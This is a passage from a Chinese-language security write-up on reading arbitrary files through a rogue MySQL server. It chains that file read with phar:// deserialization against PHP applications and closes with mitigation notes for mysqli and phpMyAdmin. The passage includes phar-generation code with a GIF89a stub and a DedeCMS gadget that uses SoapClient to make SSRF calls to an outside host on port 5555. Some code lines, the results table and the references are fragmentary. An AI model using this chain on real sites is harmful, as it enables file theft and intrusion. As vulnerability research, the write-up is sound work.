    stream = php_stream_open_wrapper_ex(filename, "rb" ....);
从这里，我们再回到mysql的load file local语句中，在mysqli中，mysql的读文件是通过php的函数实现的
    https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52
    if (PG(open_basedir)) {
            if (php_check_open_basedir_ex(filename, 0) == -1) {
                strcpy(info->error_msg, "open_basedir restriction in effect. Unable to open file");
                info->error_no = CR_UNKNOWN_ERROR;
                DBG_RETURN(1);
            }
        }
        info->filename = filename;
        info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
也同样调用了`php_stream_open_wrapper_ex`函数，也就是说，我们同样可以通过读取phar文件来触发反序列化。
### 复现
首先需要一个生成一个phar
    pphar.php
    startBuffering();
    $phar->setStub("GIF89a ".""); //设置stub
    $o = new A();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    ?>
使用该文件生成一个phar.phar
然后我们模拟一次查询
    test.php
    'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
        public $dsql;
        function __construct(){
            $this->dsql = new SoapClient(null,array('uri'=>'http://xxxx:5555', 'location'=>'http://xxxx:5555/aaa'));
        }
        function __destruct() {
            unset($this->tpl);
            $this->dsql->Close(TRUE);
        }
    }
    @unlink("dedecms.phar");
    $phar = new Phar("dedecms.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a".""); //设置stub，增加gif文件头
    $o = new Control();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    ?>
然后我们可以直接通过前台上传头像来传文件，或者直接后台也有文件上传接口，然后将rogue mysql server来读取这个文件
    phar://./dedecms.phar/test.txt
监听5555可以收到
ssrf进一步可以攻击redis等拓展攻击面，就不多说了。
## 部分CMS测试结果
CMS名 | 影响版本 | 是否存在mysql任意文件读取 | 是否有可控的MySQL服务器设置 | 是否有可控的反序列化 | 是否可上传phar | 补丁  
---|---|---|---|---|---|---  
phpmyadmin | 
对于不同服务端来说，这个配置都有不同的关法，对于JDBC来说，这个配置叫做`allowLoadLocalInfile`
  * 
在php的mysqli和mysql两种链接方式中，底层代码直接决定了这个配置。
这个配置是`PHP_INI_SYSTEM`，在php的文档中，这个配置意味着`Entry can be set in php.ini or
httpd.conf`。
所以只有在php.ini中修改`mysqli.allow_local_infile = Off`就可以修复了。
在php7.3.4的更新中，mysqli中这个配置也被默认修改为关闭
可惜在不再更新的旧版本mysql5.6中，无论是mysql还是mysqli默认都为开启状态。
现在的代码中也可以通过`mysqli_option`，在链接前配置这个选项。
比较有趣的是，通过这种方式修复，虽然禁用了`allow_local_infile`，但是如果使用wireshark抓包却发现`allow_local_infile`仍是启动的（但是无效）。
在旧版本的phpmyadmin中，先执行了`mysqli_real_connect`，然后设置`mysql_option`，这样一来`allow_local_infile`实际上被禁用了，但是在发起链接请求时中`allow_local_infile`还没有被禁用。
实际上是因为`mysqli_real_connect`在执行的时候，会初始化`allow_local_infile`。在php代码底层`mysqli_real_connect`实际是执行了`mysqli_common_connect`。而在`mysqli_common_connect`的代码中，设置了一次`allow_local_infile`。
如果在`mysqli_real_connect`之前设置`mysql_option`，其`allow_local_infile`的配置会被覆盖重写，其修改就会无效。
phpmyadmin在1月22日也正是通过交换两个函数的相对位置来修复了该漏洞。
# 说在最后
这是一个针对mysql
feature的攻击模式，思路非常有趣，就目前而言在mysql层面没法修复，只有在客户端关闭了这个配置才能避免印象。虽然作为攻击面并不是很广泛，但可能针对一些特殊场景的时候，可以特别有效的将一个正常的功能转化为任意文件读取，在拓展攻击面上非常的有效。
详细的攻击场景这里就不做假设了，危害还是比较大的。
# REF
  * 
  * 
  * 
  * 
* * *